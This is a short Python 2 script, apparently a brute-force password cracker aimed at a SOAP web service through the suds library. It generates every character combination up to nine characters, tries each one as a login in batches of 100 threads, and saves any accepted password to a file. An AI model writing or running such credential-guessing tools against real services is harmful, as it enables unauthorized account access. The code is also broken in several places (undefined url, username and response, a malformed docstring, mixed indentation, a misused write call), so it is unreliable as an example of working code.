import sys
import suds
import itertools
import time
import threading


characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890.!?"
#characters = "abcdefghijklmnopqrstuvwxyz"


found = False

def hello_world( text="toto"):
    '''Call HelloWorld web service'''
    time1 = time.time()
    # open zip, pdf, web service etc....
    time2 = time.time()
    print "Time hello_world webservices: "+str(time2 - time1)
    return response


threads = []

def test_pass(passwd):
  '''Handler ''''
    print "try : ", passwd
    try:
        #passwd = "CEGIDEN"
        client = suds.client.Client(url, username=username, password=passwd)
        #if there was no error the password will be shown and the programm exits
        hello_world()
        print "The password is: ", passwd
        found = True
        f = open('./pwd.txt', 'w')
        f.write(passwd,'\n')  # python will convert \n to os.linesep
        f.close()
        exit()
    except RuntimeError:
        pass
    except Exception as e:
        pass


for leng in range(1, 10):
    #create an iterator over the cartesian product of all possible permuations
    it = itertools.product(characters, repeat=leng)

    for passw in it:

        #join the tupel to a string and set the password
        passwd = ''.join(passw)
        #test_pass(passwd)
        t = threading.Thread(target=test_pass, args=(passwd,))
        threads.append(t)
        t.start()
        if found == True:
            exit()
        if len(threads) >= 100:
            for t in threads:
                t.join();
            threads = []
